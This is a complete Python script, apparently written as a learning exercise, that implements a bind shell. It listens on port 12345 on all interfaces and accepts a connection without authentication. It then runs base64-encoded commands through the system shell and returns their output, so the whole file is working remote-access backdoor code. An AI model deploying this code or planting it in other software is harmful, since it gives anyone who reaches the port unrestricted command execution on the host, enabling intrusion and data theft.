import base64
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #opens a socket with ipv4 and working on TCP
s.bind(("0.0.0.0", 12345))
print("Socket bind complete")
s.listen()
print("Socket listening complete")
conn, addr = s.accept()
print("Connected by", addr)
while True:#keeps the "conversion" between the server and client fluent
  command_bytes = conn.recv(1024)
  if not command_bytes:
    break

  command_input = base64.b64decode(command_bytes).decode("utf-8").strip()

  if command_input == "exit":
    conn.close()
    break

  try:# if the client wishes to use cd we will use os library and not subprocess library
    if command_input.startswith("cd "):
      target_dir = command_input[3:].strip()
      os.chdir(target_dir)
      output = f"Directory changed to: {os.getcwd()}\n"

    else:#if the client wishes to use any other command other than cd
      result = subprocess.run(
          command_input,
          shell=True,
          stdout=subprocess.PIPE,
          stderr=subprocess.PIPE,
          text=True,
      )
      output = result.stdout + result.stderr
      if not output:
        output = "Command executed with no output."

  except Exception as e:# if an exception happend doesn't crash the code
    output = f"Error: {str(e)}"


  data_encoded = base64.b64encode(output.encode("utf-8"))#encoding the data
  header = str(len(data_encoded)).zfill(10)#creating the header
  conn.send(header.encode("utf-8"))#sending the header
  conn.send(data_encoded)#sending the data




